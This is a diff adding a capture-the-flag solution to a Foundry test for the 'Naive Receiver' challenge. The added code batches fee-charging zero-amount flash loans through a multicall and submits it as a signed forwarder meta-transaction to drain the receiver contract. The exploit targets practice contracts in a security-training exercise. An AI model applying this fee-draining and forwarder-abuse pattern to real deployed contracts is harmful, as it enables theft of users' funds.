@@ -6,10 +6,13 @@ import {Test, console} from "forge-std/Test.sol";
 import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
 import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
 import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+
 
 contract NaiveReceiverChallenge is Test {
     address deployer = makeAddr("deployer");
     address recovery = makeAddr("recovery");
+    address attacker = makeAddr("attacker");
     address player;
     uint256 playerPk;
 
@@ -77,6 +80,42 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
+        console.log(weth.balanceOf(address(receiver)));
+
+      uint256 times = 10;
+      bytes[] memory data = new bytes[](times);                                                                                        
+
+        // drain user's wallet with fees
+        for (uint256 index = 0; index < times; index++) {
+            data[index]  = abi.encodeWithSelector(                                                             
+            pool.flashLoan.selector,address(receiver),address(weth),
+            0,"");
+        }
+
+        // spoof receiver
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from :address(player),
+            target : address(pool),
+            value : 0,
+            gas : 1_000_000,
+            nonce : forwarder.nonces(address(player)),
+            data : abi.encodeWithSelector(pool.multicall.selector, data),
+            deadline : block.timestamp + 1 days
+        });
+
+        // datahash
+        bytes32 dataHash = forwarder.getDataHash(request);
+        // digest
+        bytes32 digest = keccak256(abi.encodePacked(
+            "\x19\x01", forwarder.domainSeparator(), dataHash
+        ));
+
+        // signing
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk,digest);
+        bytes memory signature = abi.encodePacked(r,s,v);
+        forwarder.execute(request,signature);
+        console.log(weth.balanceOf(address(receiver)));
+
         
     }
 
